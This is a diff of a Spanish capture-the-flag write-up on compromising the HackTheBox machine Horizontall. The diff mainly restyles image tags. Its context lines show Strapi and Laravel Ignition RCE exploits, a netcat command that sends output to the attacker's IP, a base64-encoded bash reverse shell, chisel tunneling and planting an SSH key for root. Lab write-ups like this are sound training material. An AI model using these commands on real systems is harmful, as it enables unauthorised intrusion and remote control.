@@ -8,7 +8,7 @@ tags        : [ deserialization, Laravel 8, Ignition PHP, Strapi, ssh-keys ]
 ---
 Máquina Linux nivel fácil. Inspección de código fuente, problemitas con `Strapi`, con `Laravel` y con reverse shells.
 
-![374horizontallHTB](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374horizontallHTB.png)
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374horizontallHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 ## TL;DR (Spanish writeup)
 
@@ -26,9 +26,9 @@ El servicio corre `Laravel 8`, jugando de nuevo a buscar vulnerabilidades llegar
 
 ### Clasificación de la máquina según la gentesita
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374rating.png" style="display: block; margin-left: auto; margin-right: auto; width: 30%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374rating.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 30%;"/>
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374statistics.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 80%;"/>
 
 Vulnerabilidades conocidas, pero la ruta llevada por la máquina no es tan real.
 
@@ -153,7 +153,7 @@ Nada más por aquí, pues empecemos a explorar y explotar de una vez por todas!
 
 Como ya vimos en el escaneo de `nmap`, el servicio web intenta redirigir el tráfico al dominio `horizontall.htb`, por lo que si visitamos la página web colocando la dirección IP de la máquina nos debe devolver error y mostrarnos el intento de ir hacia el dominio ya citado, veamos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_error_redirect2horizontallHTB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_error_redirect2horizontallHTB.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Perfecto, vemos que intenta ir a `horizontall.htb`, pues para solucionar esto es muy sencillo.
 
@@ -168,7 +168,7 @@ Perfecto, vemos que intenta ir a `horizontall.htb`, pues para solucionar esto es
 
 Y si ahora volvemos a conectarnos ya sea contra la IP o contra el dominio, veremos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listones, ahora sí...
 
@@ -207,11 +207,11 @@ La idea es dejar que pruebe con cada palabra del archivo, así que solo nos qued
 
 Vamos a la web principal y hacemos `CTRL+U`, vemos esto:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_sourceCodeHTMLweak.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80_sourceCodeHTMLweak.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bastante feo intentar entenderlo, así que apoyémonos de internet para darle un formato lindo al código `HTML`, buscamos **beautifier HTML** y seleccionamos alguno, yo [tome este](https://www.freeformatter.com/html-formatter.html), lo siguiente es copiar y pegar el código `HTML` en el formateador y dar clic en `Format HTML`, veríamos esto:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatHTML.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, mucho mejor...
 
@@ -224,7 +224,7 @@ view-source:http://horizontall.htb/js/app.c68eb462.js
 
 Leemos y leemos, casi al final tenemos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatJS_found_api-prod_domain.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_formatJS_found_api-prod_domain.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Opaaaa, vemos otro dominio, la web supuestamente lo usa para extraer un recurso `/reviews`, pero claro, primero debemos agregar ese dominio a un archivo, ¿no? Exaaacto, al `/etc/hosts`, así lograremos que nos resuelva el contenido relacionado con ese dominio...
 
@@ -237,15 +237,15 @@ Opaaaa, vemos otro dominio, la web supuestamente lo usa para extraer un recurso 
 
 Antes de revisar lo que nos responde, recordemos que tenemos activo el descubrimiento de dominios, curiosamente al revisar tenemos esto:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_wfuzz_found_api-prod_domain.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_wfuzz_found_api-prod_domain.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 También encontramos el subdominio `api-prod`, así que existen dos maneras de obtener el dominio (: Ahora sí, revisemos que resuelve...
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Jmmm, se nos ocurre inicialmente fuzzear por directorios, es medio raro una pantalla de bienvenida así no más, pero antes de, si nos fijamos ya sea con `whatweb` (comando) o `wappalyzer` (extensión web) nos reporta algo llamado `Strapi`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_wappalyzer_Strapi.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_wappalyzer_Strapi.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, antes de caer en falsos positivos, veamos si realmente hay más recursos, pero fuera de nuestra vista, en este caso usaremos `dirsearch.py` (prácticamente es lo mismo que `WFUZZ`, solo para que vean que existen muuuuuchas herramientas):
 
@@ -266,7 +266,7 @@ Entre tooooooooodos los resultados podemos destacar esos dos recursos: `/admin` 
 http://api-prod.horizontall.htb/admin/
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_admin.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_admin.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Opaa, confirmamos lo de `Strapi`, tenemos un login-panel, probando credenciales por default no logramos pasarlo, investiguemos sobre **Strapi**:
 
@@ -287,7 +287,7 @@ Encontramos este exploit bastante reciente:
 
 Jmmm, leyendo lo que hace, inicialmente válida la versión de **Strapi** y así mismo indica si es vulnerable o no, pues corroborémosla:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_StrapiVersion.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page80api_StrapiVersion.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, es la que el exploit -explota-, así que lo más probable es que sea por acá :P
 
@@ -315,11 +315,11 @@ Descargamos el exploit a nuestra máquina y vemos su uso:
 
 Únicamente debemos pasarle la URL donde esta sirviendo **Strapi**:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_VULNERABLE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_VULNERABLE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Bien, es vulnerable y la contraseña del usuario `admin` ha sido cambiada. El exploit nos brinda una fake-shell para indicarle que comandos ejecutar, intentemos ver quien somos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_blindRCE_whoamiFAIL.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_blindRCE_whoamiFAIL.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 No obtenemos el resultado, pero el propio output nos indica el porqué, la explotación es blind, o sea, no nos va a devolver X resultado como output, por lo tanto, para confirmar que si hay **RCE** podemos enviar el resultado del comando `whoami` por medio de `netcat`, esperemos que exista, si no, directamente probamos a generar una reverse shell.
 
@@ -339,7 +339,7 @@ whoami | nc 10.10.14.78 4433
 
 Lo que hace es ejecutar el comando `whoami` y el resultado enviarlo al servidor de la IP `10.10.14.78` (mi IP) y el puerto `4433` (mi puerto), si existe el RCE (y si existe `nc` en la máquina), deberíamos obtener el resultado, veamos:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_whoamiNC_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiPY_whoamiNC_done.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Peeeeerfectísimo, el comando da como resultado al usuario `strapi`, así que existe el **RCE**, generemos una reverse shell (una terminal, algo que nos permita entrar directamente al sistema e interacción completa con él):
 
@@ -367,11 +367,11 @@ Hay [varias maneras de generar una Reverse Shell](https://github.com/swisskyrepo
 
 La ejecutamos...
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiRevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 VAMOOOOOOOOOOOOO, tamos dentrowowowowowoowjsadlkfjñas...
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_gif_letsFUCKIN6go.gif" style="display: block; margin-left: auto; margin-right: auto; width: 50%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374google_gif_letsFUCKIN6go.gif" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 50%;"/>
 
 Antes de seguir, démosle un formato más lindo a nuestra terminal, pero además de lindo algo que no nos genere problemas a futuro, así podremos ejecutar `CTRL^C` sin problema, tener histórico de los comandos y así mismo movernos entre ellos. Esto se llama hacer un **tratamiento de la TTY**:
 
@@ -443,9 +443,9 @@ Tenemos:
 
 Podemos jugar con `cURL` directamente:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_1.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 ...
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_curl8000_2.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Vemos algo que relaciona a `Laravel`, en el título se refleja y al final tenemos dos versiones de software:
 
@@ -530,15 +530,15 @@ strapi@horizontall:/tmp/test$ chmod +x chisel
 
 En la máquina de atacante ejecutamos el servidor que estará en escucha por un puerto, en mi caso por el puerto `1111`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_chisel_server.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_chisel_server.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Y ahora hacemos que la máquina víctima sea el cliente que se conecte al servidor:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_chisel_client.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_strapiSH_chisel_client.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Listones, lo que le dijimos es que se conecte al puerto `1111` de la dirección `10.10.14.78`, una vez se conecte a ese puerto, tome el contenido del servicio `8000` del localhost (`127.0.0.1`) y transforme nuestro puerto `8001` con el contenido del puerto `8000`, por lo que ahora debemos tener en nuestro puerto `8001` el servicio `Laravel`:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page8001localhost_fortwarding_laravel_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374page8001localhost_fortwarding_laravel_DONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Perfectísimo, ahora sí, intentemos explotar esta vaina...
 
@@ -569,7 +569,7 @@ Generemos el payload para intentar ejecutar el comando `id`:
 
 Guardamos el payload en el archivo `aca_ta_la_locura.phar`, el resultado es este:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_cat_payload_PHAR.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_cat_payload_PHAR.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Y ahora simplemente debemos ejecutar el exploit pasándole la URL donde esta `Laravel` e `Ignition`, junto al `payload`:
 
@@ -577,7 +577,7 @@ Y ahora simplemente debemos ejecutar el exploit pasándole la URL donde esta `La
 ❱ python3 laravel-exploits/laravel-ignition-rce.py http://localhost:8001 aca_ta_la_locura.phar
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_RCE_id_DONE.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_RCE_id_DONE.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 OPAAAAAAAAAAAAAAAAAAAA, vemos que los archivos del servicio los guarda el usuario `developer`, peeeeeeeeeero el que esta ejecutando el proceso es el usuario `root` 😵
 
@@ -601,7 +601,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43OC80NDUwIDA+JjEK
 ❱ python3 laravel-exploits/laravel-ignition-rce.py http://localhost:8001 aca_ta_la_locura.phar 
 ```
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootRevSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 La obtenemos, pero el problema es que la perdemos muy rápido, la conexión que abre el exploit se queda pegada y hace que el fortwarding se interrumpa por lo que lo cierra y perdemos toooooodo :(
 
@@ -626,19 +626,19 @@ La importante en este caso es la llave pública (`id_rsa.pub`) (esa es la que po
 
 Copiamos su contenido y ejecutamos el payload:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_phpgcc_publicSSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_phpgcc_publicSSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Ejecutamos el exploit:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_publicSSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_laravelPY_publicSSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Y si ahora intentamos autenticarnos como el usuario `root` deberíamos obtener una **Shell**:
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootSH_SSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374bash_rootSH_SSH.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 AHORA SÍÍÍÍÍÍÍÍÍÍÍÍ, tenemos una shell estable (: Veamos las flags
 
-<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374flags.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>
+<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/horizontall/374flags.png" class="img-to-zoom" data-toggle="modal" data-target=".modal-zoomed-img" style="width: 100%;"/>
 
 Hemo a c a b a u.
 
